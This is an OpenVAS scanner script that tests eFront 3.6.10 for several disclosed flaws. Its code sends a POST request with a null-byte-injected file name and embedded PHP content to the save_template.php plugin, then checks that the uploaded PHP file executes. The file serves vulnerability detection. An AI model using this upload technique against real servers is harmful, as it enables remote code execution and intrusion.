###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_efront_50391.nasl 13 2013-10-27 12:16:33Z jan $
#
# eFront 3.6.10 Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "eFront is prone to multiple security vulnerabilities, including:

1. A remote code injection vulnerability
2. Multiple SQL injection vulnerabilities
3. An authentication bypass and privilege escalation vulnerability
4. A remote code execution vulnerability
5. A file upload vulnerability

Attackers can exploit these issues to bypass certain security
restrictions, insert arbitrary code, obtain sensitive information,
execute arbitrary code, modify the logic of SQL queries, and upload
arbitrary code. Other attacks may also be possible.

eFront 3.6.10 is vulnerable; prior versions may also be affected.";

tag_solution = "Updates are available. Please see the references for more information.";

if (description)
{
 script_id(103316);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-10-31 13:36:15 +0100 (Mon, 31 Oct 2011)");
 script_bugtraq_id(50391);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("eFront 3.6.10 Multiple Security Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50391");
 script_xref(name : "URL" , value : "http://bugs.efrontlearning.net/browse/EF-675");
 script_xref(name : "URL" , value : "http://www.efrontlearning.net/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if installed efront is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("secpod_efront_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port, app:"eFront"))exit(0);
host = get_host_name();

rand = rand();
template = string("openvas-",rand,".php");

ex = string("templateName=",template,"%00&templateContent=<?php print 'openvas-c-e-test'; ?>");
len = strlen(ex);

url = string(dir, "/www/editor/tiny_mce/plugins/save_template/save_template.php");

req = string(
	     "POST ", url, " HTTP/1.1\r\n",
	     "Host: ", host,"\r\n",
	     "Content-Length: ", len,"\r\n",
	     "Content-Type: application/x-www-form-urlencoded\r\n",
	     "Connection: close\r\n",
	     "\r\n",
	     ex
	     );

res = http_send_recv(port:port, data:req);

if(res =~ "HTTP/1.. 200") {

  url = string(dir, "/www/content/editor_templates/",template);

  if(http_vuln_check(port:port, url:url, pattern:"openvas-c-e-test")) { 

    security_hole(port:port);
    exit(0);

  }  
}

exit(0);

